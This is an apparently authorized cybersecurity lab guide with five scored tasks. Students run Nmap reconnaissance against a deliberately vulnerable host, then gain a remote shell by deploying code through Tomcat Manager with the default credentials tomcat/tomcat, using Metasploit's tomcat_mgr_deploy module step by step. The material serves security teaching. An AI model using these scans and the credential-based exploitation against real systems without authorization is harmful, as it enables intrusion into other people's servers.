## Scenario 1: Network Reconnaissance & Exploitation

> **Network:** Assigned scope `$TARGET_SUBNET`. Kali `$TARGET_KALI`; meta `$TARGET_META`; optional DVWA target `$TARGET_DVWA`.

Offensive · 5 tasks · 275 points · Tasks 1–4 auto-score; Task 5 requires flag submission.

## 0. Before you start: the big picture

Work from **Kali Linux (CLI)** through five steps: discover responding hosts, enumerate meta's ports, identify its services, demonstrate default-credential access through Tomcat Manager, and submit your Kali username.

**Kali** is your machine with security tools. **meta** is the intentionally vulnerable target. The assigned lab network defines your authorized scope; a discovery scan produces a host list within that scope. DVWA is optional in this scenario.

| Host | Assigned address | Purpose |
| --- | --- | --- |
| Kali | `$TARGET_KALI` | Enter commands in **Kali Linux (CLI)**. |
| meta | `$TARGET_META` | Required target; Tomcat Manager listens on 8180. |
| DVWA | `$TARGET_DVWA` | Optional exploration if this host is available. |

The portal fills these addresses into the Guide and its Copy buttons. Compare them with the lab header. Use the displayed numeric addresses, including inside Metasploit; its console does not expand Kali shell variables.

## 1. The tools you'll use

**Nmap** sends network probes and interprets replies. Host discovery identifies responding machines; a port scan identifies reachable services; service detection adds software information. A **port** is a numbered network endpoint used by a service, such as SSH on 22.

**Metasploit** runs exploit modules. Its **Meterpreter** session is a specialized command interpreter; the `shell` command opens a Linux command shell inside that remote session. Neither is the normal Kali shell.

Tomcat **Manager** can deploy web applications. In this lab, default credentials permit a deployment that runs code as the `tomcat` service account. Software versions alone do not prove this weakness; the tested credentials and deployment capability matter.

## 2. How scoring works

Tasks 1–3 check Nmap command history against your assigned subnet or target, with a working subnet route. The checker does not grade every output row, so read the output as learning evidence. Task 4 requires a **live, target-correlated Metasploit session**. Keep that session open until the task is credited. Exiting is cleanup, not a scoring prerequisite.

Task 5 checks your submitted Kali username. Automatic checks can take a few seconds. If a command has returned to the Kali prompt, pressing Enter can trigger the shell's history-writing hook. Do not repeatedly use **Manual Check**: it is available once per task; an unsuccessful check moves the task to instructor review. Check the command context, address, and result first.

| Task | Existing navigation title | Points |
| --- | --- | --- |
| 1 | Host Discovery | 50 |
| 2 | Port Enumeration | 50 |
| 3 | Service Version Detection | 50 |
| 4 | Tomcat Manager Exploitation | 75 |
| 5 | Capture the Flag (whoami) | 50 |

## 3. Set up your lab

1. Start **Network Reconnaissance & Exploitation** and wait for **ACTIVE**.
2. Select **Kali Linux (CLI)** and confirm the assigned addresses in the lab header.
3. Run the required scans only against your assigned lab network.

## 4. Do the tasks

### Task 1: Host Discovery

**Goal:** identify hosts that respond within your assigned subnet.

**Where to work:** normal shell in **Kali Linux (CLI)**.

1. Run in the Kali shell:

```bash
nmap -sn $TARGET_SUBNET
```

2. Find the report for meta `$TARGET_META` and read its host status. `-sn` requests discovery without a port scan. Nmap can use different probes, including local-network discovery; this is not limited to one kind of ping.

**Expected result — do not type this:** a responding host's report includes `Host is up`. Your `/24` contains 256 addresses (`.0` through `.255`); conventional IPv4 subnets reserve network and broadcast addresses, leaving 254 ordinary host addresses. A scan does not mean every address will respond.

**Done when:** you identify meta in the responding-host list and **Host Discovery** is credited. Seeing DVWA is optional.

> **Troubleshooting:** If no hosts respond, confirm **ACTIVE**, **Kali Linux (CLI)**, and the assigned subnet. Discovery may miss a host that does not answer its probes; do not assume that means the machine does not exist.

### Task 2: Port Enumeration

**Goal:** identify meta's open TCP ports, including Tomcat on 8180.

**Where to work:** normal shell in **Kali Linux (CLI)**.

1. Run the targeted scan in the Kali shell:

```bash
nmap -p 21,22,80,8180 $TARGET_META
```

2. Read the columns: **PORT** is the port/protocol; **STATE** describes the response; **SERVICE** is Nmap's service label. Without version detection, the label is not proof of the exact software.
3. Record which ports are open. **Open** means a service accepts connections; **closed** means the host responds but no service listens there; **filtered** means probes do not establish whether the port is open, often because traffic is blocked.

**Expected result:** this lab normally exposes 21, 22, 80, and 8180. Focus on meta's result, not another host's output.

**Done when:** you can identify the open ports including 8180 and **Port Enumeration** is credited. Scoring checks the targeted scan command and network route, not each reported state.

> **Troubleshooting:** If 8180 is missing, confirm you used `-p 21,22,80,8180` and meta's assigned address. Wait for startup and retry once. A fast scan may omit 8180; persistent missing services need an instructor check.

**Optional — Kali shell:** `nmap -F $TARGET_META` scans common ports and may omit 8180; `nmap -p- $TARGET_META` scans all 65,535 TCP ports and takes longer. Neither replaces the targeted required path.

### Task 3: Service Version Detection

**Goal:** add software and version information to meta's port list.

**Where to work:** normal shell in **Kali Linux (CLI)**; the required host is meta.

1. Run in the Kali shell:

```bash
nmap -sV -p 21,22,80,8180 $TARGET_META
```

2. Compare with Task 2. `-sV` probes services to add product/version information, rather than relying only on a port's usual service name.

**Expected result — illustrative, do not type this:** SSH may be identified as `OpenSSH` and 8180 as an Apache Tomcat HTTP service; exact strings and versions can vary. A version string is a clue for investigation, not proof that exploitation will work.

**Done when:** you can describe the service information on meta's open ports and **Service Version Detection** is credited. The checker requires `-sV` against an assigned victim address and a working route; the required learning path uses meta.

**Why it matters:** the next task tests Tomcat Manager's default credentials and application deployment capability, rather than assuming an old version alone is exploitable.

### Task 4: Tomcat Manager Exploitation

**Goal:** demonstrate a remote session on meta as the `tomcat` account.

**Where to work:** **Kali Linux (CLI)**, moving from the Kali shell to Metasploit, Meterpreter, then a remote shell.

#### 1. Start Metasploit from the Kali shell

Confirm meta's numeric address in the lab header. The Guide fills it into `set RHOSTS` below. Metasploit does **not** expand shell variables: never type a dollar-prefixed target name at its prompt. If an exported/raw guide still shows a placeholder, replace it with your assigned numeric address before using it.

In the Kali shell:

```bash
msfconsole -q
```

**Expected result:** a Metasploit prompt such as `msf6 >`.

#### 2. Configure and run inside msfconsole

Run **one command at a time**, pressing Enter after each. All blocks in this step belong in **msfconsole**, not a Linux shell.

Inside msfconsole, select the module:

```bash
use exploit/multi/http/tomcat_mgr_deploy
```

Inside msfconsole, set meta's numeric address (Copy fills in the assigned IP):

```bash
set RHOSTS $TARGET_META
```

Inside msfconsole, set the lab's Tomcat port:

```bash
set RPORT 8180
```

Inside msfconsole, set the lab username:

```bash
set HttpUsername tomcat
```

Inside msfconsole, set the lab password:

```bash
set HttpPassword tomcat
```

Inside msfconsole, set the required Manager API path:

```bash
set PATH /manager/text
```

Inside msfconsole, select the required Java Universal target **before running**:

```bash
set TARGET 1
```

Inside msfconsole, run the module:

```bash
run
```

**Expected result:** a session-open message for your meta target, followed by `meterpreter >`. A message saying the exploit completed without a session is not success.

#### 3. Inspect the remote identity

At **Meterpreter**, open a remote command shell:

```bash
shell
```

At the **remote Linux shell on meta**, inspect the account:

```bash
id
```

**Expected output — illustrative, do not type this:** `uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)`. Numeric IDs may differ. `shell` opens a shell within the remote session; you are still on meta. If `id` says “Unknown command,” you are probably still at Meterpreter; run `shell` first.

**Done when:** you observe the `tomcat` identity and **Tomcat Manager Exploitation** is credited. **Keep the remote session open until credit appears**: the current checker requires the active target connection, not a history flush.

#### 4. Return to Kali after credit

At the **remote Linux shell**, exit to Meterpreter:

```bash
exit
```

At **Meterpreter**, exit to msfconsole:

```bash
exit
```

At **msfconsole**, exit to the normal Kali shell:

```bash
exit
```

Check the prompt after each step; do not paste three exits blindly if you are already in Kali. Task 5 runs from the Kali account, not the remote `tomcat` account.

> **Troubleshooting:** Connection failure: check **ACTIVE**, numeric RHOSTS and port 8180. Authentication failure: check `HttpUsername` and `HttpPassword` are both `tomcat`. No session: confirm `PATH /manager/text` and `TARGET 1` before `run`. If you closed the session before credit, rerun the configured module and keep the new session open. Persistent failures need an instructor check.

**Why it matters:** in this lab, known default credentials allowed code deployment as a service account. Scenario 4 addresses that credential weakness.

### Task 5: Capture the Flag (whoami)

**Goal:** identify your Kali login account and submit that username.

**Where to work:** normal shell in **Kali Linux (CLI)**, then this task's **Status** area in the exercise panel.

1. If still in Metasploit or the remote session, follow Task 4's prompt-specific exit sequence after Task 4 is credited. Confirm you are back at Kali's normal shell; `meterpreter >`, `msf… >`, and the remote meta shell are the wrong contexts.
2. In the **Kali shell**, run:

```bash
whoami
```

3. Select **Capture the Flag (whoami)** in task navigation. While it is incomplete, type the printed username into **Submit the flag you found** under **Status**, then select **Submit**.

**Expected result — example only:** `student` is a possible Kali username, not a guaranteed answer. Use your actual output. The earlier remote `tomcat` identity is not this flag.

**Done when:** the submitted Kali username is accepted and the task is credited. The field disappears after completion. This flag checks the Kali account; it does not prove the remote identity. All five tasks complete the scenario.

## 5. Recon playground (optional, not scored)

After the required tasks, use the Kali shell against your assigned meta address: `nmap -sV -sC $TARGET_META` adds default scripts; `nmap -p- $TARGET_META` checks all TCP ports. Compare observations without assuming every probe creates a Wazuh alert. DVWA `$TARGET_DVWA` is optional if available. Keep exploration within assigned lab scope.
